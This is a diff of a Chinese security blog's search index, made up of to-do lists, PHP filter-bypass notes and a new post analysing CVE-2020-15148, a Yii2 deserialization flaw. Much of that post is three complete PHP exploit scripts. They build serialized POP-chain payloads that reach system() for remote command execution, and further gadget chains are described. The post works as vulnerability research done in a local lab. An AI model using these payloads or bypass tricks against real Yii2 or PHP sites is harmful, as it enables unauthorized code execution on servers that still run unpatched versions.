@@ -6,7 +6,7 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>ca01hの笔记本</title>
+    <title></title>
     <url>/home/</url>
     <content><![CDATA[<figure class="highlight plain"><figcaption><span>wiki</span></figcaption><table><tr><td class="code"><pre><span class="line"> _____       ___   _____   ___   _   _        _____   _       _____   _____  </span><br><span class="line">&#x2F;  ___|     &#x2F;   | &#x2F;  _  \ |_  | | | | |      |  _  \ | |     &#x2F;  _  \ &#x2F;  ___| </span><br><span class="line">| |        &#x2F; &#x2F;| | | | | |   | | | |_| |      | |_| | | |     | | | | | |     </span><br><span class="line">| |       &#x2F; &#x2F; | | | |&#x2F;| |   | | |  _  |      |  _  | | |     | | | | | |  _  </span><br><span class="line">| |___   &#x2F; &#x2F;  | | | |_| |   | | | | | |      | |_| | | |___  | |_| | | |_| | </span><br><span class="line">\_____| &#x2F;_&#x2F;   |_| \_____&#x2F;   |_| |_| |_|      |_____&#x2F; |_____| \_____&#x2F; \_____&#x2F; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <blockquote>
@@ -18,10 +18,37 @@
 <h3 id="2020">2020</h3>
 <p><strong>【未完成】SCTF复盘：<a href="https://github.com/SycloverSecurity/SCTF2020/tree/master/Web">https://github.com/SycloverSecurity/SCTF2020/tree/master/Web</a></strong></p>
 <p><strong>【未完成】<a href="https://bycsec.top/2020/08/05/Thinkphp-vuln/">Thinkphp-vuln</a></strong></p>
+<h4 id="October">October</h4>
+<ul>
+<li>
+<p><strong><s>【已完成】Yii2反序列化POP链分析</s></strong></p>
+</li>
+<li>
+<p><strong>【未完成】<a href="https://www.gem-love.com/ctf/2634.html#babyback">巅峰极客Babyback复盘</a></strong></p>
+</li>
+<li>
+<p><strong>【未完成】DataCon复盘（阶段二）</strong></p>
+</li>
+<li>
+<p><strong>【未完成】星盟公开课准备工作</strong></p>
+</li>
+<li>
+<p><strong>【未完成】论文开题报告</strong></p>
+</li>
+<li>
+<p><strong>【未完成】xmctf出题</strong></p>
+</li>
+<li>
+<p><strong>【未完成】BUU刷题</strong></p>
+</li>
+<li>
+<p><s><strong>【已完成】HTB Doctor靶机</strong></s></p>
+</li>
+</ul>
 <h4 id="September">September</h4>
 <ul>
 <li><s><strong>【已完成】实习+HW</strong></s></li>
-<li><strong>【未完成】DataCon复盘</strong></li>
+<li><s><strong>【已完成】DataCon复盘（阶段一）</strong></s></li>
 <li><s><strong>【已完成】2020巅峰极客CTF</strong></s></li>
 </ul>
 <h4 id="August">August</h4>
@@ -61,7 +88,7 @@
 <li><strong>【未完成】《机器学习实战》前七章</strong></li>
 <li><s><strong>【已完成】BUUCTF刷题</strong></s></li>
 <li><strong>【未完成】HackTheBox OpenKeys（账号又被封了。。。</strong></li>
-<li><strong>【未完成】PHP构造反序列化链再学习</strong></li>
+<li><s><strong>【已完成】PHP构造反序列化链再学习</strong></s></li>
 </ul>
 <h4 id="July">July</h4>
 <ul>
@@ -160,38 +187,6 @@
 </li>
 </ul>
 <h2 id="Awesome-Articals-Projects">Awesome Articals/Projects</h2>
-<h3 id="Bypass-Tricks">Bypass &amp; Tricks</h3>
-<h4 id="PHP">PHP</h4>
-<h5 id="preg-match绕过">preg_match绕过</h5>
-<blockquote>
-<p>参考文章：<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p>
-</blockquote>
-<ul>
-<li>数组绕过</li>
-<li>PCRE回溯限制（code-breaking2018）</li>
-<li>换行符</li>
-</ul>
-<h5 id="PHP字符串解析特性绕过">PHP字符串解析特性绕过</h5>
-<blockquote>
-<p>参考文章：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
-</blockquote>
-<p>借用一张图简单地记一下</p>
-<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708203746.png" alt=""></p>
-<h5 id="SSRF-file协议绕过">SSRF file协议绕过</h5>
-<p>如果SSRF中<code>file://</code>关键字被禁用，可以使用<code>file:/</code>或者<code>file:///</code>来代替。</p>
-<p>例题：<a href="https://buuoj.cn/challenges#%5BGKCTF2020%5DEZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb">[GKCTF2020]EZ三剑客-EzWeb</a></p>
-<h5 id="Session绕过">Session绕过</h5>
-<p>删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的<code>$_SESSION['var']</code>就为NULL，相当于传参NULL。</p>
-<p>例题：<a href="https://buuoj.cn/challenges#%5BBJDCTF%202nd%5D%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B">BJDCTF2nd 文件探测</a></p>
-<h5 id="利用数组绕过">利用数组绕过</h5>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">ereg(pattern,<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">Array</span>(),<span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure>
-<p>例题：<a href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">0CTF2016 piapiapia</a></p>
-<h5 id="basename绕过">basename绕过</h5>
-<p>从 <a href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a> 找到了<code>basename()</code>函数的一个问题，它会去掉文件名开头的非ASCII值：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(basename(<span class="string">&quot;xffconfig.php&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br><span class="line">var_dump(basename(<span class="string">&quot;config.php/xff&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure>
-<p>例题：<a href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">[Zer0pts2020]Can you guess it?</a></p>
-<h5 id="htaccess利用">.htaccess利用</h5>
-<p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks总结</a></p>
 <h3 id="Linux入侵检测">Linux入侵检测</h3>
 <p><a href="https://github.com/grayddq/GScan">https://github.com/grayddq/GScan</a></p>
 <h3 id="红蓝对抗">红蓝对抗</h3>
@@ -213,6 +208,38 @@
 <p><a href="https://github.com/geekcompany/ResumeSample">https://github.com/geekcompany/ResumeSample</a></p>
 <p><a href="https://github.com/zhaoweiho/web-sec-interview">https://github.com/zhaoweiho/web-sec-interview</a></p>
 <p><a href="https://github.com/EvilAnne/Pentest_questions">https://github.com/EvilAnne/Pentest_questions</a></p>
+<h2 id="Bypass-Tricks">Bypass &amp; Tricks</h2>
+<h3 id="PHP">PHP</h3>
+<h4 id="preg-match绕过">preg_match绕过</h4>
+<blockquote>
+<p>参考文章：<a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">https://www.cnblogs.com/20175211lyz/p/12198258.html</a></p>
+</blockquote>
+<ul>
+<li>数组绕过</li>
+<li>PCRE回溯限制（code-breaking2018）</li>
+<li>换行符</li>
+</ul>
+<h4 id="PHP字符串解析特性绕过">PHP字符串解析特性绕过</h4>
+<blockquote>
+<p>参考文章：<a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>
+</blockquote>
+<p>借用一张图简单地记一下</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200708203746.png" alt=""></p>
+<h4 id="SSRF-file协议绕过">SSRF file协议绕过</h4>
+<p>如果SSRF中<code>file://</code>关键字被禁用，可以使用<code>file:/</code>或者<code>file:///</code>来代替。</p>
+<p>例题：<a href="https://buuoj.cn/challenges#%5BGKCTF2020%5DEZ%E4%B8%89%E5%89%91%E5%AE%A2-EzWeb">[GKCTF2020]EZ三剑客-EzWeb</a></p>
+<h4 id="Session绕过">Session绕过</h4>
+<p>删除cookie，没有cookie中的SESSIONID就找不到对应的session文件，相应的<code>$_SESSION['var']</code>就为NULL，相当于传参NULL。</p>
+<p>例题：<a href="https://buuoj.cn/challenges#%5BBJDCTF%202nd%5D%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B">BJDCTF2nd 文件探测</a></p>
+<h4 id="利用数组绕过">利用数组绕过</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">md5(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">sha1(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">ereg(pattern,<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br><span class="line">preg_match(pattern,<span class="keyword">Array</span>()) = <span class="literal">false</span></span><br><span class="line">strcmp(<span class="keyword">Array</span>(), <span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strpos(<span class="keyword">Array</span>(),<span class="string">&quot;abc&quot;</span>) = <span class="literal">null</span></span><br><span class="line">strlen(<span class="keyword">Array</span>()) = <span class="literal">null</span></span><br></pre></td></tr></table></figure>
+<p>例题：<a href="https://buuoj.cn/challenges#%5B0CTF%202016%5Dpiapiapia">0CTF2016 piapiapia</a></p>
+<h4 id="basename绕过">basename绕过</h4>
+<p>从 <a href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a> 找到了<code>basename()</code>函数的一个问题，它会去掉文件名开头的非ASCII值：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(basename(<span class="string">&quot;xffconfig.php&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br><span class="line">var_dump(basename(<span class="string">&quot;config.php/xff&quot;</span>)); <span class="comment">// =&gt; config.php</span></span><br></pre></td></tr></table></figure>
+<p>例题：<a href="https://buuoj.cn/challenges#%5BZer0pts2020%5DCan%20you%20guess%20it?">[Zer0pts2020]Can you guess it?</a></p>
+<h4 id="htaccess利用">.htaccess利用</h4>
+<p><a href="https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks%E6%80%BB%E7%BB%93">https://www.cnblogs.com/20175211lyz/p/11741348.html#htaccess-tricks总结</a></p>
 ]]></content>
   </entry>
   <entry>
@@ -323,6 +350,7 @@
 <li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
 <li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
 <li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+<li><a href="/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95">CVE-2020-15148 Yii2反序列化</a></li>
 </ul>
 <h1 id="流量分析"><strong>流量分析</strong></h1>
 <ul>
@@ -16559,6 +16587,100 @@ base64 只有大写字母和数字，小写字母组成，后面一般是两个�
       <tags>
         <tag>靶机</tag>
         <tag>HTB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Yii2反序列化漏洞分析及拓展</title>
+    <url>/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95/</url>
+    <content><![CDATA[<h1 id="CVE-2020-15148-Yii2-反序列化分析及拓展">CVE-2020-15148 Yii2 反序列化分析及拓展</h1>
+<h2 id="漏洞范围">漏洞范围</h2>
+<ul>
+<li>Yii2 &lt; 2.0.38</li>
+</ul>
+<h2 id="环境安装">环境安装</h2>
+<p>这里直接选择去GitHub官方仓库拉取Yii2的源代码：</p>
+<p><a href="https://github.com/yiisoft/yii2/releases">https://github.com/yiisoft/yii2/releases</a></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210340.png" alt=""></p>
+<p>下载到本地后解压到web目录，修改<code>config/web.php</code>文件里<code>cookieValidationKey</code>的值</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210528.png" alt=""></p>
+<p>再在Controller添加一个反序列化的入口代码：</p>
+<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006210912.png" style="zoom:50%;" />
+<p>MacOS下用MAMP搭建PHP调试环境，测试一下：</p>
+<blockquote>
+<p>搭建教程：<a href="https://www.sqlsec.com/2020/07/macphp.html">https://www.sqlsec.com/2020/07/macphp.html</a></p>
+</blockquote>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201006211613.png" alt=""></p>
+<p>验证成功，开始审计。</p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>根据现有的资料，反序列化的起点是在<code>yii\db\BatchQueryResult</code>类中，文件位置<code>/vendor/yiisoft/yii2/db/BatchQueryResult.php</code>：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007211913.png" alt=""></p>
+<p><code>__destruct()</code>函数调用了<code>reset()</code>方法，<code>reset()</code>方法中的<code>_dataReader</code>参数是可控的，并且调用了该参数的<code>close()</code>函数，那么此处就可以作为跳板，去执行其他类中的<code>__call()</code>函数，全局查找关键字<code>function __call</code>：</p>
+<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224238.png" style="zoom:50%;" />
+<p>一共有找到16个<code>__call()</code>函数，那就一个一个的分析下来，其中Codeception组件中多数是直接抛出异常，没有可利用的地方，但是<code>Faker\Generator</code>类是可以成为POP链的。具体代码位于：<code>/vendor/fzaninotto/faker/src/Faker/Generator.php</code></p>
+<p>首先<code>__call()</code>函数中调用了<code>format()</code>方法：</p>
+<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224606.png" style="zoom:50%;" />
+<p>接着跟下去<code>format()</code>方法，参数<code>$method</code>和<code>$attributes</code>都是不可控的：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007224816.png" alt=""></p>
+<p>在<code>format()</code>方法内部，使用回调函数<code>call_user_func_array()</code>调用了<code>getFormatter()</code>方法。在该方法中，我们只关心第一个if语句，</p>
+<p>由于<code>$this-&gt;formatter</code>是我们可控的，所以这里就可以调用任意类中的任意方法了。但是上面提到过，此时<code>$formatter='close'</code>而<code>$arguments</code>为空，也就是说<code>call_user_func_array()</code>这个函数的第一个参数可控，第二个参数为空。说的更透彻一点，要寻找的就是可以实现RCE的任意一个方法，并且参数是类的成员变量！</p>
+<p>同样的，这里我们用<code>call_user_func()</code>去实现RCE，用正则表达式<code>call_user_func(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)\)</code>去匹配参数的限制，全局搜索：</p>
+<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007231112.png" style="zoom:50%;" />
+<p><code>yii\rest\CreateAction::run()</code>和<code>yii\rest\IndexAction::run()</code>都可以实现上述条件下的RCE：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007231243.png" alt=""></p>
+<p>那么整个POP链也就清楚了：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yii\db\BatchQueryResult::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\CreateAction::run()</span><br></pre></td></tr></table></figure>
+<h2 id="编写EXP">编写EXP</h2>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $_dataReader;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201007233404.png" alt=""></p>
+<h2 id="继续挖掘">继续挖掘</h2>
+<p>新版本的<code>BatchQueryResult</code>类已经无法反序列化了，那就全局搜索<code>__destruct()</code>函数，然后一个个的排查。</p>
+<h3 id="第一条POP链">第一条POP链</h3>
+<p>触发点位于<code>vendor\codeception\codeception\ext\RunProcess.php</code>，POP链如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Codeception\Extension\RunProcess::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
+<p>EXP：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $process;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;process = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="第二条POP链">第二条POP链</h3>
+<p>触发点位于<code>vendor\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php</code>，POP链如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Tags\Deprecated.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
+<p>EXP：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">id</span>;</span><br><span class="line">        <span class="keyword">public</span> $checkAccess;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Deprecated</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">Deprecated</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">private</span> $keys;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> Deprecated();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(<span class="string">&quot;just&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;for&quot;</span>=&gt;<span class="string">&quot;ca01h&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>虽然报错，但命令还是成功执行了。</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008174414.png" alt=""></p>
+<p>与此类似的POP链还有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Tags\See.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
+<p>以及</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Swift\KeyCache\DiskKeyCache::__destruct()</span><br><span class="line">-&gt;</span><br><span class="line">src\DocBlock\Description.php::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
+<h3 id="第三条POP链">第三条POP链</h3>
+<blockquote>
+<p>PHP &gt; 7.1</p>
+</blockquote>
+<p>再来一个从<code>__wakeup</code>入手的POP链，反序列化起点位于<code>vendor\symfony\string\UnicodeString.php</code></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008213827.png" alt=""></p>
+<p>继续跟<code>normalizer_is_normalized()</code>函数</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008213922.png" alt=""></p>
+<p>跟进静态方法<code>isNormalized()</code></p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214024.png" alt=""></p>
+<p>看到<code>preg_match($s)</code>，那么``normalizer_is_normalized()<code>就可以作为跳板触发</code>__toString()`方法，接下来又可以和上面提到的POP链连在一起了。</p>
